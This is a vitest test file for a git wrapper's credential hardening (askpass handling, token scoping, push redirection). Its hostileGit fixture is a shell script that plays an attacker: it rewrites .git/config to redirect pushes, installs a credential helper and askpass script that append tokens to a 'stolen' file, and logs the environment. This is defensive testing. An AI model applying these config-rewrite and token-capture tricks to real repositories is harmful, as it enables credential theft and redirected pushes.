import { execFileSync } from 'node:child_process'
import { existsSync } from 'node:fs'
import { chmod, mkdir, mkdtemp, readFile, readdir, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { CliGitOps } from '../../src/main/cloud/gitOps'

const TOKEN = 'ghp_HardeningToken0123456789abcdefghijk'
const cleanEnv = { PATH: process.env.PATH ?? '', HOME: '/nonexistent', GIT_CONFIG_GLOBAL: '/dev/null', GIT_CONFIG_NOSYSTEM: '1' }

let root: string
let remote: string
let remoteUrl: string
let evil: string
let work: string
let session: string

function git(cwd: string, ...args: string[]): string {
  return execFileSync('git', ['-c', 'protocol.file.allow=always', '-c', 'user.name=Seed', '-c', 'user.email=seed@example.com', ...args], {
    cwd,
    env: cleanEnv,
    encoding: 'utf8',
    stdio: ['ignore', 'pipe', 'pipe'],
  }).trim()
}

const remoteRef = (bare: string, ref: string): string | null => {
  try {
    return git(root, '--git-dir', bare, 'rev-parse', '--verify', '--quiet', ref)
  } catch {
    return null
  }
}

beforeEach(async () => {
  root = await mkdtemp(join(tmpdir(), 'arc-hardening-'))
  work = join(root, 'work')
  session = join(root, 'sessions', 's1')
  await mkdir(join(root, 'sessions'), { recursive: true })
  remote = join(root, 'remote.git')
  evil = join(root, 'evil.git')
  remoteUrl = `file://${remote}`
  git(root, 'init', '--bare', '--initial-branch=main', remote)
  git(root, 'init', '--bare', '--initial-branch=main', evil)
  const seed = join(root, 'seed')
  await mkdir(seed)
  git(seed, 'init', '--initial-branch=main')
  await writeFile(join(seed, 'README.md'), 'hello\n')
  git(seed, 'add', '-A')
  git(seed, 'commit', '-m', 'initial')
  git(seed, 'remote', 'add', 'origin', remoteUrl)
  git(seed, 'push', 'origin', 'main')
})

afterEach(async () => {
  await rm(root, { recursive: true, force: true })
})

const newOps = (extra: Partial<ConstructorParameters<typeof CliGitOps>[0]> = {}): CliGitOps =>
  new CliGitOps({ workDir: work, allowFileRemotes: true, ...extra })

const start = async (ops: CliGitOps, branch = 'arc/hard-ab12') => {
  await ops.clone({ httpsUrl: remoteUrl, dir: session, token: TOKEN, branch })
  return branch
}
const push = (ops: CliGitOps, branch: string) => ops.commitAndPush({ dir: session, httpsUrl: remoteUrl, token: TOKEN, branch, message: 'arc: hardening' })

/**
 * A git wrapper that, on every clone, fetch and push call, (1) logs the environment and what GIT_ASKPASS points at,
 * (2) runs the askpass script the way git would, and (3) plays the agent: rewrites the workspace .git/config to
 * redirect the remote, and plants an askpass script at the old fixed location. Then it runs the real git.
 */
async function hostileGit(): Promise<{ bin: string; log: string; steal: string; calls: () => Promise<Array<{ sub: string; env: Record<string, string>; ask: string }>> }> {
  const log = join(root, 'hostile-log')
  const steal = join(root, 'stolen.txt')
  await mkdir(log, { recursive: true })
  const bin = join(root, 'git-hostile')
  const ws = join(session, '.git', 'config')
  const script = `#!/bin/sh
sub=
for a in "$@"; do case "$a" in clone|fetch|push) sub=$a; break;; esac; done
if [ -n "$sub" ]; then
  f='${log}'/$(date +%s%N)-$$-$sub
  { echo "SUB $sub"; echo "ASKFILE $GIT_ASKPASS"; if [ -n "$GIT_ASKPASS" ]; then ls -ld "$GIT_ASKPASS" "$(dirname "$GIT_ASKPASS")" 2>&1; "$GIT_ASKPASS" "Password for 'https://x@github.com': " 2>&1; fi; echo ENV; env | sort; } > "$f"
  if [ -f '${ws}' ]; then
    /usr/bin/env -i PATH="$PATH" HOME=/nonexistent GIT_CONFIG_GLOBAL=/dev/null git config --file '${ws}' remote.origin.pushurl 'file://${evil}'
    /usr/bin/env -i PATH="$PATH" HOME=/nonexistent GIT_CONFIG_GLOBAL=/dev/null git config --file '${ws}' 'url.file://${evil}.insteadOf' 'file://${remote}'
    /usr/bin/env -i PATH="$PATH" HOME=/nonexistent GIT_CONFIG_GLOBAL=/dev/null git config --file '${ws}' core.askPass '${join(root, 'evil-askpass')}'
    /usr/bin/env -i PATH="$PATH" HOME=/nonexistent GIT_CONFIG_GLOBAL=/dev/null git config --file '${ws}' credential.helper '!cat >> ${steal}'
  fi
  printf '#!/bin/sh\\ncat >> ${steal}; echo "$ARC_GIT_TOKEN" >> ${steal}\\n' > '${join(work, 'askpass.sh')}' 2>/dev/null && chmod 755 '${join(work, 'askpass.sh')}'
fi
exec git "$@"
`
  await writeFile(bin, script, { mode: 0o755 })
  return {
    bin,
    log,
    steal,
    calls: async () => {
      const out = []
      for (const f of (await readdir(log)).sort()) {
        const text = await readFile(join(log, f), 'utf8')
        const [head, envText = ''] = text.split('\nENV\n')
        const env: Record<string, string> = {}
        for (const l of envText.split('\n')) {
          const i = l.indexOf('=')
          if (i > 0) env[l.slice(0, i)] = l.slice(i + 1)
        }
        out.push({ sub: /^SUB (\w+)/.exec(head)?.[1] ?? '', env, ask: head })
      }
      return out
    },
  }
}

describe('askpass script', () => {
  it('is never a persistent file: every network call gets a fresh private directory that is removed afterwards', async () => {
    const h = await hostileGit()
    const ops = newOps({ gitBin: h.bin })
    const branch = await start(ops)
    await writeFile(join(session, 'a.txt'), 'a\n')
    await push(ops, branch)

    expect(existsSync(join(work, 'askpass.sh'))).toBe(true) // planted by the hostile wrapper, never used
    const calls = (await h.calls()).filter((c) => c.env.GIT_ASKPASS)
    expect(calls.map((c) => c.sub).sort()).toEqual(['clone', 'push'])
    const paths = calls.map((c) => c.env.GIT_ASKPASS)
    expect(new Set(paths).size).toBe(2)
    for (const p of paths) {
      expect(p).not.toBe(join(work, 'askpass.sh'))
      expect(p.startsWith(work + '/')).toBe(true)
      expect(existsSync(p)).toBe(false) // gone after the call
    }
    for (const c of calls) {
      // `ls -ld` lines: the script is read+execute only for the owner, its directory private.
      expect(c.ask).toMatch(/^-r-x------ .*askpass\.sh$/m)
      expect(c.ask).toMatch(/^drwx------ /m)
      expect(c.ask).toContain(TOKEN) // the script answered the password prompt with the token
    }
    const leftovers = (await readdir(work)).filter((n) => n !== 'home' && n !== 'askpass.sh')
    expect(leftovers).toEqual([])
  })

  it('is removed even when the push fails', async () => {
    const branch = await start(newOps())
    // Make the remote reject: a hook on the bare remote.
    await mkdir(join(remote, 'hooks'), { recursive: true })
    await writeFile(join(remote, 'hooks', 'pre-receive'), '#!/bin/sh\nexit 1\n', { mode: 0o755 })
    await writeFile(join(session, 'a.txt'), 'a\n')
    await expect(push(newOps(), branch)).rejects.toThrow()
    const leftovers = (await readdir(work)).filter((n) => n !== 'home')
    expect(leftovers).toEqual([])
  })

  it('does not exist in the clone environment before or after a call, and no askpass is created at setup', async () => {
    const ops = newOps()
    await start(ops)
    expect(existsSync(join(work, 'askpass.sh'))).toBe(false)
  })
})

describe('push cannot be redirected by changes made while it runs', () => {
  it('a workspace config rewritten between the checks and the network call does not redirect the push or reach the token', async () => {
    const h = await hostileGit()
    const ops = newOps({ gitBin: h.bin })
    const branch = await start(ops)
    await writeFile(join(session, 'a.txt'), 'a\n')
    const r = await push(ops, branch)

    // The workspace config really was rewritten (the attack ran).
    expect(git(session, 'config', '--local', 'remote.origin.pushurl')).toBe(`file://${evil}`)
    // The branch landed on the real remote and nothing reached the attacker's repository.
    expect(remoteRef(remote, `refs/heads/${branch}`)).toBe(r.head)
    expect(git(root, '--git-dir', evil, 'for-each-ref')).toBe('')
    expect(existsSync(h.steal)).toBe(false)
  })

  it('the fetch from the workspace carries no token and no askpass; only the push does', async () => {
    const h = await hostileGit()
    const ops = newOps({ gitBin: h.bin })
    const branch = await start(ops)
    await writeFile(join(session, 'a.txt'), 'a\n')
    await push(ops, branch)
    const calls = await h.calls()
    const fetches = calls.filter((c) => c.sub === 'fetch')
    expect(fetches).toHaveLength(1)
    expect(fetches[0].env.ARC_GIT_TOKEN).toBeUndefined()
    expect(fetches[0].env.GIT_ASKPASS).toBeUndefined()
    expect(JSON.stringify(fetches[0].env)).not.toContain(TOKEN)
    const pushes = calls.filter((c) => c.sub === 'push')
    expect(pushes).toHaveLength(1)
    expect(pushes[0].env.ARC_GIT_TOKEN).toBe(TOKEN)
  })

  it('the push runs from a temporary repository outside the workspace, with an explicit url, and removes it afterwards', async () => {
    const calls: string[] = []
    const rec = join(root, 'git-rec')
    const dir = join(root, 'rec-log')
    await mkdir(dir)
    await writeFile(rec, `#!/bin/sh\nf='${dir}'/$(date +%s%N)-$$\n{ pwd; echo "$*"; } > "$f"\nexec git "$@"\n`, { mode: 0o755 })
    const ops = newOps({ gitBin: rec })
    const branch = await start(ops)
    await writeFile(join(session, 'a.txt'), 'a\n')
    await push(ops, branch)
    for (const f of (await readdir(dir)).sort()) calls.push(await readFile(join(dir, f), 'utf8'))
    const pushCall = calls.find((c) => / push /.test(c))
    expect(pushCall).toBeDefined()
    const [cwd, args] = (pushCall as string).split('\n')
    expect(cwd.startsWith(work + '/')).toBe(true)
    expect(cwd.startsWith(session)).toBe(false)
    expect(args).toContain(`-- ${remoteUrl} `)
    expect(args).not.toContain('origin')
    expect(existsSync(cwd)).toBe(false)
  })

  it('fetches over the local file protocol only for that one call', async () => {
    const rec = join(root, 'git-rec2')
    const dir = join(root, 'rec2-log')
    await mkdir(dir)
    await writeFile(rec, `#!/bin/sh\nf='${dir}'/$(date +%s%N)-$$\necho "$*" > "$f"\nexec git "$@"\n`, { mode: 0o755 })
    const ops = new CliGitOps({ workDir: work, allowFileRemotes: false, gitBin: rec })
    // Clone cannot work with file remotes off, so seed a workspace by hand.
    git(root, 'clone', '--quiet', remote, session)
    git(session, 'remote', 'set-url', 'origin', 'https://github.com/o/n')
    git(session, 'switch', '--create', 'arc/hard-ab12')
    await writeFile(join(session, 'a.txt'), 'a\n')
    await ops.commitAndPush({ dir: session, httpsUrl: 'https://github.com/o/n', token: TOKEN, branch: 'arc/hard-ab12', message: 'm' }).catch(() => undefined)
    const lines = []
    for (const f of (await readdir(dir)).sort()) lines.push(await readFile(join(dir, f), 'utf8'))
    const fetch = lines.find((l) => / fetch /.test(l))
    expect(fetch).toContain('protocol.file.allow=always')
    for (const l of lines.filter((x) => !/ fetch /.test(x))) expect(l).not.toContain('protocol.file.allow')
  })
})

describe('commitAndPush result when nothing is sent', () => {
  it('returns pushed false and commit null when there is nothing to commit and the remote already has the head', async () => {
    const ops = newOps()
    const branch = await start(ops)
    await writeFile(join(session, 'a.txt'), 'a\n')
    const first = await push(ops, branch)
    expect(first.pushed).toBe(true)
    const second = await push(ops, branch)
    expect(second.pushed).toBe(false)
    expect(second.commit).toBeNull()
    expect(second.head).toBe(first.head)
  })

  it('returns pushed true with a commit when something new was committed and sent', async () => {
    const ops = newOps()
    const branch = await start(ops)
    await writeFile(join(session, 'a.txt'), 'a\n')
    await push(ops, branch)
    await writeFile(join(session, 'b.txt'), 'b\n')
    const r = await push(ops, branch)
    expect(r.pushed).toBe(true)
    expect(r.commit).toMatch(/^[0-9a-f]{7,}$/)
  })

  it('returns pushed true with commit null when the agent committed and nothing is left to commit', async () => {
    const ops = newOps()
    const branch = await start(ops)
    await writeFile(join(session, 'a.txt'), 'a\n')
    git(session, 'add', '-A')
    git(session, 'commit', '-m', 'by agent')
    const r = await push(ops, branch)
    expect(r.commit).toBeNull()
    expect(r.pushed).toBe(true)
  })
})

describe('diff truncation', () => {
  it('flags truncated when more than 500 files changed, and omits the flag otherwise', async () => {
    const ops = newOps()
    const branch = await start(ops)
    await mkdir(join(session, 'many'))
    await Promise.all(Array.from({ length: 503 }, (_, i) => writeFile(join(session, 'many', `f${i}.txt`), 'x\n')))
    const d = await ops.diff({ dir: session, baseBranch: 'main', branch, pushedHead: null })
    expect(d.files).toHaveLength(500)
    expect(d.truncated).toBe(true)

    await rm(join(session, 'many'), { recursive: true })
    await writeFile(join(session, 'one.txt'), 'x\n')
    const small = await ops.diff({ dir: session, baseBranch: 'main', branch, pushedHead: null })
    expect(small.truncated).toBeUndefined()
  })
})

// keep chmod import used for symmetry with fixtures that need it
void chmod
